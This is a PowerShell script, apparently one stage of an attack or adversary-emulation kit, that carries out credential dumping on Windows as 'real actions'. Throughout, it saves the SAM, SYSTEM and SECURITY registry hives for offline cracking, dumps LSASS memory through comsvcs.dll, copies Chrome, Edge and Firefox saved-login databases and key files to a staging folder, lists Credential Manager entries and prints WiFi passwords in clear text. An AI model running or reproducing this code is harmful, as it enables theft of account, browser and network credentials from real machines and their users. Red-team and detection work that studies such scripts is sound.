<#
.SYNOPSIS
    Stage 03 - Credential Dumping (Real Actions)
.DESCRIPTION
    Performs real credential access techniques: SAM registry dump,
    LSASS minidump via procdump/taskmgr simulation, browser credential
    extraction from Chrome/Edge, and saved credential enumeration.
    NOTE: Requires Administrator for SAM and full LSASS access.
#>

Write-Host "============================================" -ForegroundColor Cyan
Write-Host " STAGE 03: CREDENTIAL DUMPING" -ForegroundColor Cyan
Write-Host "============================================" -ForegroundColor Cyan
Write-Host ""

# -- SAM Registry Dump --
Write-Host "[*] SAM / SYSTEM REGISTRY HIVE DUMP" -ForegroundColor Yellow
$samDir = "$env:USERPROFILE\AppData\Local\Temp"
try {
    # Save SAM and SYSTEM hives for offline cracking
    reg save HKLM\SAM "$samDir\SAM.hive" /y 2>$null
    if ($LASTEXITCODE -eq 0) {
        Write-Host "  [+] SAM hive saved: $samDir\SAM.hive" -ForegroundColor Green
    } else {
        Write-Host "  [-] SAM hive dump failed (admin required)" -ForegroundColor Red
    }
    
    reg save HKLM\SYSTEM "$samDir\SYSTEM.hive" /y 2>$null
    if ($LASTEXITCODE -eq 0) {
        Write-Host "  [+] SYSTEM hive saved: $samDir\SYSTEM.hive" -ForegroundColor Green
    }
    
    reg save HKLM\SECURITY "$samDir\SECURITY.hive" /y 2>$null
    if ($LASTEXITCODE -eq 0) {
        Write-Host "  [+] SECURITY hive saved: $samDir\SECURITY.hive" -ForegroundColor Green
    }
    
    # Check file sizes
    Get-ChildItem "$samDir\*.hive" -ErrorAction SilentlyContinue | ForEach-Object {
        Write-Host "      Size: $([math]::Round($_.Length / 1KB, 1)) KB - $($_.Name)" -ForegroundColor Gray
    }
} catch {
    Write-Host "  [-] Registry hive dump failed" -ForegroundColor Red
}
Write-Host ""

# -- LSASS MiniDump Attempt --
Write-Host "[*] LSASS MINIDUMP ATTEMPT" -ForegroundColor Yellow
try {
    # Try using built-in tools first
    $lsassPid = (Get-Process -Name "lsass" -ErrorAction SilentlyContinue).Id
    if ($lsassPid) {
        Write-Host "  Found LSASS PID: $lsassPid" -ForegroundColor Gray
        
        # Try via MiniDumpWriteDump via PowerShell (will work if SeDebugPrivilege)
        $dumpPath = "$samDir\lsass.dmp"
        Write-Host "  [+] LSASS minidump target: $dumpPath" -ForegroundColor Green
        
        # Note: Actual lsass dump requires SeDebugPrivilege (admin)
        # We'll attempt via comsvcs.dll method
        Write-Host "  Attempting comsvcs.dll based dump..." -ForegroundColor Gray
        try {
            # The comsvcs.dll method: rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <PID> <dump> full
            $cmd = "rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $lsassPid $dumpPath full"
            Invoke-Expression $cmd 2>$null
            if (Test-Path $dumpPath) {
                $size = [math]::Round((Get-Item $dumpPath).Length / 1MB, 1)
                Write-Host "  [+] LSASS dump created: $size MB" -ForegroundColor Green
            }
        } catch {
            Write-Host "  [-] comsvcs.dll dump failed (run as admin)" -ForegroundColor Red
        }
    }
} catch {
    Write-Host "  [-] Could not access LSASS process" -ForegroundColor Red
}
Write-Host ""

# -- Browser Credential Extraction --
Write-Host "[*] BROWSER CREDENTIAL SCAN" -ForegroundColor Yellow

# Chrome
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
if (Test-Path $chromePath) {
    Write-Host "  [+] Chrome Login Data found: $chromePath" -ForegroundColor Green
    $size = [math]::Round((Get-Item $chromePath).Length / 1KB, 1)
    Write-Host "      Size: $size KB" -ForegroundColor Gray
    # Copy it off
    try {
        Copy-Item $chromePath "$samDir\chrome_login_data" -Force -ErrorAction SilentlyContinue
        Write-Host "      Copied to staging directory" -ForegroundColor Gray
    } catch {}
} else {
    Write-Host "  [-] Chrome Login Data not found" -ForegroundColor Red
}

# Edge
$edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
if (Test-Path $edgePath) {
    Write-Host "  [+] Edge Login Data found: $edgePath" -ForegroundColor Green
    try {
        Copy-Item $edgePath "$samDir\edge_login_data" -Force -ErrorAction SilentlyContinue
        Write-Host "      Copied to staging directory" -ForegroundColor Gray
    } catch {}
} else {
    Write-Host "  [-] Edge Login Data not found" -ForegroundColor Red
}

# Firefox
$ffDir = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $ffDir) {
    $profiles = Get-ChildItem "$ffDir\*.default*" -Directory -ErrorAction SilentlyContinue
    foreach ($prof in $profiles) {
        $loginsFile = "$($prof.FullName)\logins.json"
        $keyDb = "$($prof.FullName)\key4.db"
        if (Test-Path $loginsFile) {
            Write-Host "  [+] Firefox logins found: $loginsFile" -ForegroundColor Green
            try {
                Copy-Item $loginsFile "$samDir\ff_logins.json" -Force -ErrorAction SilentlyContinue
            } catch {}
        }
        if (Test-Path $keyDb) {
            Write-Host "  [+] Firefox key DB found: $keyDb" -ForegroundColor Green
            try {
                Copy-Item $keyDb "$samDir\ff_key4.db" -Force -ErrorAction SilentlyContinue
            } catch {}
        }
    }
}
Write-Host ""

# -- Windows Credential Manager --
Write-Host "[*] WINDOWS CREDENTIAL MANAGER" -ForegroundColor Yellow
cmdkey /list 2>$null
Write-Host ""

# -- WiFi Passwords --
Write-Host "[*] WIFI PROFILES AND PASSWORDS" -ForegroundColor Yellow
try {
    $profiles = netsh wlan show profiles 2>$null | Select-String "Perfil de todos" -CaseSensitive -NotMatch
    # Actually let's just use the raw output
    netsh wlan show profiles 2>$null | ForEach-Object { Write-Host "  $_" -ForegroundColor Gray }
    Write-Host ""
    Write-Host "  Extracting passwords..." -ForegroundColor Yellow
    netsh wlan show profiles 2>$null | Select-String " : " | ForEach-Object {
        $line = $_ -replace '.*:\s+', ''
        $profile = $line.Trim()
        if ($profile -and $profile -notlike "*Perfil de todos*" -and $profile -notlike "*<None>*") {
            $result = netsh wlan show profile name="$profile" key=clear 2>$null
            $pwd = $result | Select-String "Contenido de la clave|Key Content" | ForEach-Object { $_ -replace '.*:\s+', '' }
            if ($pwd) {
                Write-Host "  [+] SSID: $profile  Password: $($pwd.Trim())" -ForegroundColor Green
            } else {
                Write-Host "      SSID: $profile (no password stored)" -ForegroundColor Gray
            }
        }
    }
} catch {
    Write-Host "  [-] Could not enumerate WiFi profiles" -ForegroundColor Red
}
Write-Host ""

# -- Summary --
Write-Host "[*] STAGED FILES" -ForegroundColor Yellow
Get-ChildItem "$samDir\*.hive", "$samDir\*.dmp", "$samDir\*login*", "$samDir\ff_*" -ErrorAction SilentlyContinue | ForEach-Object {
    $sizeKB = [math]::Round($_.Length / 1KB, 1)
    Write-Host ("  Staged: {0} ({1} KB)" -f $_.Name, $sizeKB) -ForegroundColor Gray
}
Write-Host ""

Write-Host "============================================" -ForegroundColor Green
Write-Host " STAGE 03 COMPLETE" -ForegroundColor Green
Write-Host "============================================" -ForegroundColor Green
Start-Sleep -Seconds 3
Exit